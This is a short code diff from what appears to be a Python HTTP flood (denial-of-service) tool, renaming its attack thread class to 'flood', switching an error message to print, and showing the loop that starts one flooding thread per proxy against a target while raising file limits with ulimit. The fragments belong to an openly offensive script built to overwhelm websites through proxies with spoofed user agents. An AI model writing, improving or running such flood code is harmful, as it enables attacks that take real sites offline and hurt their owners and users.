@@ -1213,7 +1213,7 @@ google_agents = [
 ]
 
 
-class fucker(threading.Thread):
+class flood(threading.Thread):
 
     def __init__(self, url, number, proxy):
         threading.Thread.__init__(self)
@@ -1247,7 +1247,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("Connection Proxy Lost or Target maybe down!!\n")
+                print("Connection Proxy Lost or Target maybe down!!\n")
                 sys.exit(0)
         sys.exit(0)
 
@@ -1303,7 +1303,7 @@ class MainLoop():
         num_threads = int(num_threads)
     for i in range(num_threads):
         in_line = in_file.readline()
-        fucker(target, i + 1, in_line).start()
+        flood(target, i + 1, in_line).start()
         in_line = in_line[:-1]
         while True:
             os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
